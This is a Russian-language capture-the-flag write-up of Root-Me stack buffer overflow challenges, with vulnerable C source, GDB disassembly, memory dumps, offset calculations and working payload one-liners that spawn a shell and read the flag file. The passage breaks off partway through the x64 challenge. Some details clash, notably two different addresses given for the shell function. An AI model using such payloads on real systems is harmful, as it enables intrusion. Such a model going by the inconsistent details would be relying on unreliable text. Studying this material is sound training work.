 
# [[Buffer owerflow|Buffer Overflow]] 

**Подготовка**

1. **Определить цель:** Нужно понять что надо перезаписать, это может быть какой-то адрес (в основном это адрес возврата), значение переменной или это может быть дургие данные. При успешной атаке переполнения буфера злоумышленник может перезаписать различные данные в памяти программы, включая:

    - Адреса возврата функций: злоумышленник может изменить адрес возврата функции, чтобы заставить программу выполнить зловредный код.

    - Переменные и данные программы: злоумышленник может изменить значения переменных в программе, что может привести к некорректному поведению или утечке конфиденциальных данных.

    -  Структуры данных: злоумышленник может изменить структуры данных программы, что может нарушить логику работы программы или привести к ошибкам.

    -  Управляющие структуры: злоумышленник может изменить управляющие структуры данных, такие как указатели на память, что может привести к некорректной работе программы или даже к краху.

    -  Системные данные: в некоторых случаях атака переполнения буфера может привести к изменению системных данных, что может оказать влияние на работу всей системы. Это лишь несколько примеров того, что можно перезаписать с помощью атаки переполнения буфера. Важно обратить внимание на этот тип уязвимости и принять меры для ее предотвращения. 

2. **Фактический адрес буфера:** Это адрес памяти где происходит наш запись, именно при наличие уязвимости в записи мы можем выполнить атаку. Нам нужно определить фактически адрес буфера где происходит запись данных.

3. **Вычисление расстояния:** После того как мы поняли что хотим перезаписать, и нашли эффективный адрес памяти где происходит запись пользовательских данных (наш буфер), то нам осталось всего лишь вычилислить расстояние между нашим целем (что нужно перезаписать) и буфером где происходить запись, а после перезаписать цель, за счет записи большого обьема данных.

4. **Перезапись:**  Перезаписать цель, за счет записи большого обьема данных.

## ELF x86 - Stack buffer overflow basic 1

Платформа: https://www.root-me.org/
**Уровень:** Easy

```c
#include <stdlib.h>
#include <stdio.h>

/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/

int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

Очень простое задание. Без харденинг защит да и к тому же есть исходный код. Суть задачи переполнить буфер и перезаписать переменную check к конкретную значению, а именно к значению **"0xdeadbeef"** после чего откроется шелл и можно будет получить флаг.  

### Создание шаблона

Запускаем отладчик GDB. Переполняем буфер и перезаписываем значение переменной.  
  
```
gdb -q ./ch13 
r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ 
q
```

![[Pasted image 20230602021748.png]]

Видно такую конструкцию  

```  
[buf]: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK 
[check] 0x4b4b4b4b  
```
  
эти данные говорят  
  
- **[buf]** что это та строчка которая влезла в буфер и за его пределы  
- **[check]** текущие значение переменной  

### Поиск смещений 

Запустим Python чтобы вычислить размер строки и для того, чтобы узнать что это за значение хранится в переменной check.

```
python3
len("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK") 
chr(0x4b) 
quit()
```

![[Pasted image 20230602022023.png]]

Видно и становится ясно, что это **0x4b4b4b4b == "KKKK"**.  По условию задания **check** должен быть значению **0xdeadbeef** тогда откроется шелл, после чего можно получить флаг.  Составим эксплойт.  

40 байт пойдут в буфер, а следующие 4 на перезапись переменной check куда мы положим значение 0xdeadbeef.  Чтобы не мучатся, адреса воспользуемся модулем struct.  

**Решение №2**

И так, мы должны:

1. Найти адрес буфера где проходит запись пользовательских данных;
2. Найти переменную которую хотим перезаписать;
3. Вычислить расстояние от буфера до переменной;
4. Перезаписать;

### Анализ функции main

Насколько нам известно из исходного кода, да и после запуска программы что значение переменной `check` **0x4030201**. Запускаем программу в отладчике gdb:

```
gef➤  disassemble main  
Dump of assembler code for function main:  
  0x08048546 <+0>:     lea    ecx,[esp+0x4]  
  0x0804854a <+4>:     and    esp,0xfffffff0  
  0x0804854d <+7>:     push   DWORD PTR [ecx-0x4]  
  0x08048550 <+10>:    push   ebp  
  0x08048551 <+11>:    mov    ebp,esp  
  0x08048553 <+13>:    push   esi  
  0x08048554 <+14>:    push   ebx  
  0x08048555 <+15>:    push   ecx  
  0x08048556 <+16>:    sub    esp,0x3c  
  0x08048559 <+19>:    call   0x8048480 <__x86.get_pc_thunk.bx>  
  0x0804855e <+24>:    add    ebx,0x1aa2  
  0x08048564 <+30>:    mov    DWORD PTR [ebp-0x1c],0x4030201  
  0x0804856b <+37>:    mov    eax,DWORD PTR [ebx-0x4]  
  0x08048571 <+43>:    mov    eax,DWORD PTR [eax]  
  0x08048573 <+45>:    sub    esp,0x4  
  0x08048576 <+48>:    push   eax  
  0x08048577 <+49>:    push   0x2d  
  0x08048579 <+51>:    lea    eax,[ebp-0x44]  
  0x0804857c <+54>:    push   eax  
  0x0804857d <+55>:    call   0x80483c0 <fgets@plt>  
  0x08048582 <+60>:    add    esp,0x10  
  0x08048585 <+63>:    sub    esp,0x8  
  0x08048588 <+66>:    lea    eax,[ebp-0x44]  
  0x0804858b <+69>:    push   eax  
  0x0804858c <+70>:    lea    eax,[ebx-0x1940]  
  0x08048592 <+76>:    push   eax  
  0x08048593 <+77>:    call   0x80483b0 <printf@plt>  
  0x08048598 <+82>:    add    esp,0x10  
  0x0804859b <+85>:    sub    esp,0x8  
  0x0804859e <+88>:    push   DWORD PTR [ebp-0x1c]  
  0x080485a1 <+91>:    lea    eax,[ebx-0x1934]  
  0x080485a7 <+97>:    push   eax  
  0x080485a8 <+98>:    call   0x80483b0 <printf@plt>  
  0x080485ad <+103>:   add    esp,0x10  
  0x080485b0 <+106>:   cmp    DWORD PTR [ebp-0x1c],0x4030201  
  0x080485b7 <+113>:   je     0x80485d4 <main+142>  
  0x080485b9 <+115>:   cmp    DWORD PTR [ebp-0x1c],0xdeadbeef  
  0x080485c0 <+122>:   je     0x80485d4 <main+142>  
  0x080485c2 <+124>:   sub    esp,0xc  
  0x080485c5 <+127>:   lea    eax,[ebx-0x1928]  
  0x080485cb <+133>:   push   eax  
  0x080485cc <+134>:   call   0x80483e0 <puts@plt>  
  0x080485d1 <+139>:   add    esp,0x10  
  0x080485d4 <+142>:   cmp    DWORD PTR [ebp-0x1c],0xdeadbeef  
  0x080485db <+149>:   jne    0x804862c <main+230>  
  0x080485dd <+151>:   sub    esp,0xc  
  0x080485e0 <+154>:   lea    eax,[ebx-0x190c]  
  0x080485e6 <+160>:   push   eax  
  0x080485e7 <+161>:   call   0x80483e0 <puts@plt>  
  0x080485ec <+166>:   add    esp,0x10  
  0x080485ef <+169>:   call   0x80483d0 <geteuid@plt>  
  0x080485f4 <+174>:   mov    esi,eax  
  0x080485f6 <+176>:   call   0x80483d0 <geteuid@plt>  
  0x080485fb <+181>:   sub    esp,0x8  
  0x080485fe <+184>:   push   esi  
  0x080485ff <+185>:   push   eax  
  0x08048600 <+186>:   call   0x8048400 <setreuid@plt>  
  0x08048605 <+191>:   add    esp,0x10  
  0x08048608 <+194>:   sub    esp,0xc  
  0x0804860b <+197>:   lea    eax,[ebx-0x18e2]  
  0x08048611 <+203>:   push   eax  
  0x08048612 <+204>:   call   0x80483f0 <system@plt>  
  0x08048617 <+209>:   add    esp,0x10  
  0x0804861a <+212>:   sub    esp,0xc  
  0x0804861d <+215>:   lea    eax,[ebx-0x18d8]  
  0x08048623 <+221>:   push   eax  
  0x08048624 <+222>:   call   0x80483e0 <puts@plt>  
  0x08048629 <+227>:   add    esp,0x10  
  0x0804862c <+230>:   mov    eax,0x0  
  0x08048631 <+235>:   lea    esp,[ebp-0xc]  
  0x08048634 <+238>:   pop    ecx  
  0x08048635 <+239>:   pop    ebx  
  0x08048636 <+240>:   pop    esi  
  0x08048637 <+241>:   pop    ebp  
  0x08048638 <+242>:   lea    esp,[ecx-0x4]  
  0x0804863b <+245>:   ret  
End of assembler dump.
```

Давайте остановим программу там где выводит записанную строку:

```
0x08048593 <+77>:    call   0x80483b0 <printf@plt>
```

Тут уже данные после записи выводятся, поэтому тут и поставим брейкпоинт.

```
gef➤  b*0x08048593
```

### Анализ дампа памяти

Запускаем программу командой `run`, программа просит нас ввести данные и мы вводим `AAAAAAAAAAAAAAAAAAAAAAAA`, потом программа записаывает данные в буфер, а после пытается вывести записанные данные с п.м. функции `printf` и тут срабатывает брейкпоинт. Дальше делаем анализ дампа памяти.

```
gef➤  x/100bx $esp  
0xffd8d880:     0xc0    0x86    0x04    0x08    0x94    0xd8    0xd8    0xff  
0xffd8d888:     0xc0    0x05    0x2b    0xea    0x5e    0x85    0x04    0x08  
0xffd8d890:     0xd0    0x0f    0x33    0xea    0x41    0x41    0x41    0x41  
0xffd8d898:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffd8d8a0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffd8d8a8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffd8d8b0:     0x41    0x41    0x41    0x41    0x41    0x41    0x0a    0x00  
0xffd8d8b8:     0x00    0x00    0x00    0x00    0x01    0x02    0x03    0x04  
0xffd8d8c0:     0xff    0xff    0xff    0xff    0x04    0xd4    0x09    0xea  
0xffd8d8c8:     0x80    0x53    0x2f    0xea    0xf0    0xd8    0xd8    0xff  
0xffd8d8d0:     0x2c    0xfe    0x2a    0xea    0x40    0x86    0x04    0x08  
0xffd8d8d8:     0x00    0x00    0x00    0x00    0xf9    0x0a    0x0b    0xea  
0xffd8d8e0:     0x00    0x00    0x00    0x00
```

**Разборка:**

Данные записываются в сторону возрастания адресов в выделенную область памяти стека, даже если сам стек растет в сторону уменьшения адресов. Это объясняет, почему последовательность 'A' располагается таким образом.

```
0xffd8d890: 0xd0
0xffd8d891: 0x0f
0xffd8d892: 0x33
0xffd8d893: 0xea
0xffd8d894: 0x41  'A'
0xffd8d895: 0x41  'A'
0xffd8d896: 0x41  'A'
```

Мы видим, что значения `0x41` (код ASCII для 'A') начинаются с адреса `0xffd8d894`. Это значит, что наш буфер находится по адресу `0xffd8d894`.

У нас есть адрес буфера, теперь нужно найти адрес переменной которую нужно записть. Возвращаемся к `main`:

```
0x08048564 <+30>:    mov    DWORD PTR [ebp-0x1c],0x4030201  
```

Копировать значаение `0x4030201` по относительному адресу `ebp-0x1c`.  Из исходного кода мы знаем что значение `0x4030201` записывается в переменную `check`:

```c
int check = 0x04030201;
```

Эта та саммая переменная которую мы хотим перезаписать.  Еще в `main` мы нашли:

```
0x080485d4 <+142>:   cmp    DWORD PTR [ebp-0x1c],0xdeadbeef
0x080485db <+149>:   jne    0x804862c <main+230>
```

То самое место где и происходит сравнения. Вот как это выглядит в исходном коде:

```c
if (check == 0xdeadbeef){
   ...
}
```

И к какому выводу же мы пришли? Переменная `check` находится по относительному адресу `ebp-0x1c`

```
gef➤  x/dx $ebp-0x1c  
0xffd8d8bc:     0x04030201
```

- **ebp-0x1c**: Относительный адрес
- **0xffd8d8bc**: Абсолютный адрес
- **0x04030201**: Значения

Простыми словами, по относительному адресу **ebp-0x1c** находится значения **0x04030201** абсолютный адрес которого **0xffd8d8bc**. 

### Вычисление растоянии

С каждым новым запуском адреса меняются, но это не может быть проблемой поскольку расстояние отстаётся неизменным.  И так, мы нашли абсолютные адреса обе переменных, теперб вычислим расстояние между ними. Запись идёт от буфера до переменной `check`:

```
0xffd8d8bc-0xffd8d894 = 0x28 (40)
```

Итак расстояние от буфера до переменной 40 байт, 41-ый байт это уже начала перезаписи.

Давайте посмотрим что будет если записать 40 байт данных в буфер. 

```
gef➤  x/dx $ebp-0x1c  
0xffab6f4c:     0x0a  
gef➤  x/100bx $esp  
0xffab6f10:     0xc0    0x86    0x04    0x08    0x24    0x6f    0xab    0xff  
0xffab6f18:     0xc0    0x95    0xa3    0xea    0x5e    0x85    0x04    0x08  
0xffab6f20:     0xd0    0x9f    0xab    0xea    0x41    0x41    0x41    0x41  
0xffab6f28:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffab6f30:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffab6f38:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffab6f40:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffab6f48:     0x41    0x41    0x41    0x41    0x0a    0x00    0x03    0x04  
gef➤
```

**Разборка**

```
0xffab6f48: 0x41
0xffab6f49: 0x41
0xffab6f4a: 0x41
0xffab6f4b: 0x41
0xffab6f4c: 0xa    -----> переменная check 
```


### Создание полезной нагрузки

После перезаписи переменной нужным значением, нам открывается командная оболочка. 

```bash
(python3 -c 'from struct import pack;print "A"*40 + pack("I",0xdeadbeef)';ehco 'ls') | ./ch13
```

Результат выполнения команды внутри скобок (вывод Python-скрипта и команды `echo 'ls'`) передается как стандартный ввод (stdin) для программы `./ch13`.

1. Создает строку из 40 символов "A".
2. Преобразует число 0xdeadbeef в 4-байтовое целое без знака и сохраняет его в виде байтовой строки с помощью модуля struct.
3. Конкатенирует строку "A" и байтовую строку числа 0xdeadbeef, создавая входные данные с переполнением буфера.
4. Перенаправляет эти входные данные в программу ch13.
5. Сначала передаётся полезная нагрузка (с п.м. которого мы получаем доступ к оболочке), а затем передаётся результат команды `echo ls`.

Поскольку после полезной нагрузки у нас будет доступ к оболочке и во второй строчке будет команда для оболочки, корректно будет `echo ls`, а не `ls` ведь в первом случае система попытается запустить результат команды ls (название директорий и файлов), а не саму команлу `ls`.


1. **Выполнение группированных команд в скобках**:
    
    - **`(python -c 'from struct import pack;print "A"*40 + pack("I",0xdeadbeef)'; echo 'ls')`**:
    - Скобки в данном примере используются для объединения нескольких команд в одну группу, так что они могут быть выполнены в одном подконвейере. Скобки в данном контексте группируют несколько команд вместе, чтобы они выполнялись как одна единица.
    - В скобках выполняются две команды:
        
        1. `python -c 'from struct import pack; print "A"*40 + pack("I",0xdeadbeef)'`: Запускает интерпретатор Python и выполняет следующую команду на языке Python:
            - Запускается интерпретатор Python и выполняет скрипт.
            - Импортирует функцию `pack` из модуля `struct`.
            - Создает строку из 40 символов "A" и добавляет к ней упакованное значение `0xdeadbeef`.  Результатом выполнения будет строка из 40 символов "A", за которой следует упакованное значение `0xdeadbeef`.
            - Выводит результат.
        
        2. `echo 'ls'`: Выводит строку 'ls'.
             - Выполняется команда `echo "ls"`, которая выводит строку `ls`.
           
2.  **Объединение выводов команд/Группировка команд**:
    
    - Выводы обеих команд (вывод Python-скрипта и результат `echo "ls"`) объединяются.
    - Полученный вывод будет содержать две строки: одну от Python-скрипта и одну от `echo "ls"`.
    - Скобки `( ... )` группируют команды вместе, так что они выполняются последовательно в одном подконвейере. Результаты выполнения всех команд внутри скобок объединяются и передаются следующей команде.

    **Пример объединенного вывода**

    Предположим, вывод команды `python -c '...'` будет:

   ```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
   ```

 И вывод команды `echo "ls"` будет:

```
ls
```

Объединенный вывод будет таким:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde 
ls
```

1. Сначала полезная нагрузка открывает нам shell;
2. Потом во второй строке у нас команда `ls` который отправляется в shell;

Этот объединенный вывод передается программе `./ch13`.

3. **Передача объединенного вывода**:
    
    - Объединенный вывод передается на стандартный ввод (stdin) программы `./ch13`.
    - Результат выполнения команды внутри скобок (вывод Python-скрипта и команды `echo 'ls'`) передается как стандартный ввод (stdin) для программы `./ch13`.

**Порядок выполнения**:
    
  - Сначала выполняется `python -c ...`, затем выполняется `echo 'ls'`.
  - Вывод обеих команд объединяется (в две строки).


**Подтверждение**

Так что, в данном случае, команда `echo "ls"` выполняется, и ее вывод (`ls`) передается программе `./ch13`, а не сама команда `ls`. 

> Простыми словами, результат кода на Python и команды bash в две строки и будут перенаправлены в программу ./ch13 
 

**Используёте комнаду `cat`***:


>Попробуйте ввести команду `cat` без опций сами поймете. Теперь обьедените в голове логику программы и команду cat.

Давайте рассмотрим команду более подробно:

```sh
`(python3 -c 'import struct; payload = b"A"*40 + struct.pack("I", 0xdeadbeef); import sys; sys.stdout.buffer.write(payload)'; cat) | ./ch13
```

1. **Часть `(python3 -c '...'`**:

    - Запускает интерпретатор Python3 с командой, которая генерирует и выводит байтовую строку `payload`.
    - Используется `sys.stdout.buffer.write(payload)`, чтобы написать байты напрямую в стандартный вывод.
2. **`cat`**:
    
    - Команда `cat` берет стандартный ввод и пишет его в стандартный вывод.
    - Команда `cat` в данном примере используется для того, чтобы поддерживать стандартный ввод (`stdin`) открытым после выполнения первой команды. Это полезно, если программа `./ch13` ожидает ввода данных, и без `cat` программа могла бы завершиться сразу после получения первого блока данных.
    - В данном контексте, после вывода `payload`, команда `cat` позволяет сохранить стандартный ввод открытым и передавать его дальше в программу `./ch13`.
3. **`| ./ch13`**:
    
    - Передает вывод из предыдущей части команды в программу `./ch13`.
    - Программа `./ch13` получает на вход сначала сгенерированный `payload`, а затем ждет дальнейшего ввода, который может быть предоставлен командой `cat`.

В случае, если программа `./ch13` ожидает дополнительного ввода после получения первоначального `payload`, команда `cat` обеспечивает такую возможность. Если `cat` убрать, программа `./ch13` может завершиться раньше времени, не получив ожидаемых данных.
  
```
(python -c 'from struct import pack;print "A"*40 + pack("I",0xdeadbeef)';cat) | ./ch13
```  
  
затем с помощью **cat** узнаем содержимое **.passwd**  

```
cat .passwd
```  
  
`Сtrl+D`- выход.

![[Pasted image 20230602022323.png]]

На Python3:

```sh
(python3 -c 'import struct; payload = b"A"*40 + struct.pack("I", 0xdeadbeef); import sys; sys.stdout.buffer.write(payload)'; cat) | ./ch13
```

Мы используем `sys.stdout.buffer.write(payload)`, чтобы напрямую записать байты в стандартный вывод, минуя проблемы с кодировкой.

---

## ELF x86 - Stack buffer overflow basic 2

Платформа: https://www.root-me.org/
**Уровень:** Easy

```c
/*
gcc -m32 -fno-stack-protector -o ch15 ch15.c
*/

void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
 
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
 
void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

  
На этот раз есть харденинг защита в стеке и в куче. Она запрещается выполнять код в этих областях памяти. Но эта защита нам ни чем не мешает. Она просто есть, для того чтобы нельзя было пихнуть свой шеллкод так сказать. Решается это дело тоже очень просто. Суть задачи вызвать функцию shell которая предоставит нам командную оболочку, а затем мы сможем получить флаг.  

### Скармливай шаблон и получи смещение 
  
Запускаем программу под GDB и скармливаем ей [строчку сгенерированную с сайта](https://codeby.net/goto/link-confirmation?url=aHR0cHM6Ly93aXJlbWFzay5ldS90b29scy9idWZmZXItb3ZlcmZsb3ctcGF0dGVybi1nZW5lcmF0b3Iv&s=d064d3bc16a299f060bf0394a87c316e).  
  
```
gdb -q ./ch15 
r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

![[Pasted image 20230602043133.png]]

Получаем адрес смещения **0x33654132**. [Заходим на сайт и вычисляем смещение](https://codeby.net/goto/link-confirmation?url=aHR0cHM6Ly93aXJlbWFzay5ldS90b29scy9idWZmZXItb3ZlcmZsb3ctcGF0dGVybi1nZW5lcmF0b3Iv&s=d064d3bc16a299f060bf0394a87c316e)

![[Pasted image 20230602043154.png]]

128 байт область смещения. 128+4 вся область которая перезаписывает регистр EIP.  Теперь узнаем адрес функции **shell.**  
  
```
disas shell
q 
y,enter.
```


![[Pasted image 20230602043302.png]]

Функция **shell** находится в памяти по адресу **0x08048464**. Отлично теперь составим эксплойт и запустим полезную нагрузку.

**Решение №2**

### Анализ функции main

И так, давайте всё сделаем вручную, чтобы лучше понять процесс работы программы.

Сначало нужно найти адрес буфера, давайте загляним `main`:

```
Dump of assembler code for function main:  
  0x08048584 <+0>:     lea    ecx,[esp+0x4]  
  0x08048588 <+4>:     and    esp,0xfffffff0  
  0x0804858b <+7>:     push   DWORD PTR [ecx-0x4]  
  0x0804858e <+10>:    push   ebp  
  0x0804858f <+11>:    mov    ebp,esp  
  0x08048591 <+13>:    push   ebx  
  0x08048592 <+14>:    push   ecx  
  0x08048593 <+15>:    sub    esp,0x90  
  0x08048599 <+21>:    call   0x80485de <__x86.get_pc_thunk.ax>  
  0x0804859e <+26>:    add    eax,0x1a62  
  0x080485a3 <+31>:    lea    edx,[eax-0x1aa7]  
  0x080485a9 <+37>:    mov    DWORD PTR [ebp-0xc],edx  
  0x080485ac <+40>:    mov    edx,DWORD PTR [eax-0x4]  
  0x080485b2 <+46>:    mov    edx,DWORD PTR [edx]  
  0x080485b4 <+48>:    sub    esp,0x4  
  0x080485b7 <+51>:    push   edx  
  0x080485b8 <+52>:    push   0x85  
  0x080485bd <+57>:    lea    edx,[ebp-0x8c]  
  0x080485c3 <+63>:    push   edx  
  0x080485c4 <+64>:    mov    ebx,eax  
  0x080485c6 <+66>:    call   0x8048390 <fgets@plt>  
  0x080485cb <+71>:    add    esp,0x10  
  0x080485ce <+74>:    mov    eax,DWORD PTR [ebp-0xc]  
  0x080485d1 <+77>:    call   eax  
  0x080485d3 <+79>:    nop  
  0x080485d4 <+80>:    lea    esp,[ebp-0x8]  
  0x080485d7 <+83>:    pop    ecx  
  0x080485d8 <+84>:    pop    ebx  
  0x080485d9 <+85>:    pop    ebp  
  0x080485da <+86>:    lea    esp,[ecx-0x4]  
  0x080485dd <+89>:    ret  
End of assembler dump.
```

Функции `fgets` записывает ввод в буфер, после стек освобождается командой `add esp,0x10`. Наша задача найти адрес буфера, давайте поставим брекпойнт перед особождение стека.

```
b *main+71
```

Запустите программу командой `run`, а в качестве ввода введите последовательность символа `A` чтобы легче было найти его в дампе памяти.

### Анализ дампа памяти

После запуска срабатывает **breakpoint**, и теперь нужно делать анализ памяти:

```
gef➤  x/100bx $esp  
0xffc32a80:     0x9c    0x2a    0xc3    0xff    0x85    0x00    0x00    0x00  
0xffc32a88:     0xc0    0x35    0xc8    0xf3    0x9e    0x85    0x04    0x08  
0xffc32a90:     0x00    0x00    0x00    0x00    0x2e    0x4e    0x3d    0xf6  
0xffc32a98:     0xf4    0x4b    0xd0    0xf3    0x41    0x41    0x41    0x41  
0xffc32aa0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffc32aa8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffc32ab0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41  
0xffc32ab8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x0a  
0xffc32ac0:     0x00    0x00    0x00    0x00    0x01    0x00    0x00    0x00  
0xffc32ac8:     0x20    0x4a    0xd0    0xf3    0x00    0x00    0x00    0x00  
0xffc32ad0:     0x00    0x00    0x00    0x00    0xcb    0x2d    0xc3    0xff
```

Запись данных начинается с адреса `0xffc32a9c`. Это и есть абсолютный адрес буфера:

```
0xffc32a98: 0xf4
0xffc32a99: 0x4b
0xffc32a9a: 0xd0
0xffc32a9b: 0xf3
0xffc32a9c: 0x41 
0xffc32a9d: 0x41
```

При необходимости можно развернуто посмотреть содержимое `0xffc32a9c`:

```
0xffc32a9c:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffc32aac:     0x41414141      0x41414141      0x41414141      0x41414141  
0xffc32abc:     0x0a414141      0x00000000      0x00000001      0xf3d04a20
```

Ну буфер у нас находится по адресу `0xffc32a9c`.  Дальше нужно найти адрес функций которую нужно перезаписать. Обратно возвращаемся к функции `main`:

```
0x080485ce <+74>:    mov    eax,DWORD PTR [ebp-0xc]  
0x080485d1 <+77>:    call   eax
```

1. В регистр `eax` записывается адрес, который находится по относительному адресу `ebp-0xc`.  
2. После вызывается функция адрес которого находится в регистре `eax`. 

Загляним что за функция вызывается:

```
gef➤  x/x $ebp-0xc  
0xffc32b1c:     0x08048559
```

По относительному адресу `ebp-0xc` ( абсолютный адрес которого `0xffc32b1c`) находится значение `0x08048559`. Это видимо адрес, который помещается в регистр `eax` после чего вызывается. Судя по исходному коду:

```c
void (*func)()=sup;
func()
```

Я считаю что это функция `sup()`:

```
gef➤  info functions    
All defined functions:  
  
Non-debugging symbols:  
0x08048350  _init  
0x08048390  fgets@plt  
0x080483a0  geteuid@plt  
0x080483b0  puts@plt  
0x080483c0  system@plt  
0x080483d0  setreuid@plt  
0x080483e0  __libc_start_main@plt  
0x080483f0  __gmon_start__@plt  
0x08048400  _start  
0x08048440  _dl_relocate_static_pie  
0x08048450  __x86.get_pc_thunk.bx  
0x08048460  deregister_tm_clones  
0x080484a0  register_tm_clones  
0x080484e0  __do_global_dtors_aux  
0x08048510  frame_dummy  
0x08048516  shell  
0x08048559  sup        
0x08048584  main  
0x080485de  __x86.get_pc_thunk.ax  
0x080485f0  __libc_csu_init  
0x08048650  __libc_csu_fini  
0x08048654  _fini
```

Да это адрес функции `sup`! 

Нам нужно перезаписать адрес функций `sup` на функцию `shell` с п.м. переполнение. Так сам адрес `sup` находится по относительному адресу `ebp-0xc` абсолютный адрес которого `0xffc32b1c`.  

### Вычисление расстоянии

Как мы знаем адрес который нужно перезаписать находится по адресу `0xffc32b1c`. Давайте вычислим расстояние между буфером и адресом:

```
0xffc32b1c-0xffc32a9c = 0x80 (128)
```

### Создания полезной нагрузки
  
```bash 
(python -c 'from struct import pack; print "A"*128 + pack("I", 0x08048464)';cat) | ./ch15 cat .passwd
``` 
  
Вот так вот можно взять второй флаг.

На Python3:

Для перехода с Python 2 на Python 3 в данном примере, необходимо изменить синтаксис на использование байтовых строк и функций Python 3. Вот как будет выглядеть команда с учетом этих изменений:

```python
(python3 -c 'from struct import pack; import sys; sys.stdout.buffer.write(b"A"*128 + pack("I", 0x08048464))'; cat) | ./ch15 cat .passwd
```

- **Импорт модулей**:
    
    - `from struct import pack`: Импортируем функцию `pack` из модуля `struct`.
    - `import sys`: Импортируем модуль `sys` для доступа к `sys.stdout.buffer`.
- **Формирование полезной нагрузки**:
    
    - `b"A"*128`: Создаем байтовую строку из 128 символов "A".
    - `pack("I", 0x08048464)`: Упаковываем 32-битное целое число `0x08048464` в байтовую строку.
- **Вывод полезной нагрузки**:
    
    - `sys.stdout.buffer.write(...)`: Выводим байтовую строку напрямую в стандартный вывод.
- **`cat`**:
    
    - Используется для поддержки стандартного ввода открытым и передачи дополнительных данных, если это требуется.

**Пояснение использования команды:**

- Первая часть команды `python3 -c '...'` создает и выводит полезную нагрузку в виде байтовой строки.
- `cat` используется для поддержки стандартного ввода открытым.
- Результат передается в программу `./ch15` с аргументом `cat .passwd`, что вероятно указывает программе `./ch15` прочитать файл `.passwd`.

---

## ELF x64 - Stack buffer overflow - basic

Платформа: https://www.root-me.org/
**Уровень:** Easy

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/*
gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
*/

void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}

int main(int argc, char **argv){

    char buffer[256];
    int len, i;

    scanf("%s", buffer);
    len = strlen(buffer);

    printf("Hello %s\n", buffer);

    return 0;
}
```


Это обычная задачка на переполнение буфера, но в отличие от других задачек, тут x64 битная архитектура. Бегло просмотрев исходный код программы становится ясно, что нам нужно вызвать функцию `callMeMaybe()`, которая в свою очередь даст нам оболочку и заветный флаг для прохождения уровня.  
  
И так запускаем нашу программу под отладчиком GDB  
  
```
gdb -q ./ch35
```  

### Статический анализ

И дизассемблируем функцию callMeMaybe() для того чтобы узнать её адрес.  
  
```
disas callMeMaybe
```

![[Pasted image 20230602032830.png]]
### Генерация шаблона

Адрес **0x00000000004005e7** функции получен. Теперь вычислим смещение. Делать это будем по [старинке](https://codeby.net/goto/link-confirmation?url=aHR0cHM6Ly93aXJlbWFzay5ldS90b29scy9idWZmZXItb3ZlcmZsb3ctcGF0dGVybi1nZW5lcmF0b3Iv&s=d064d3bc16a299f060bf0394a87c316e) воспользуемся генератором для создания паттернов.

![[Pasted image 20230602032912.png]]

Запускаем программу под отладчиком  
  
```
run
```  
  
и скармливаем строку  
  
Код:

```
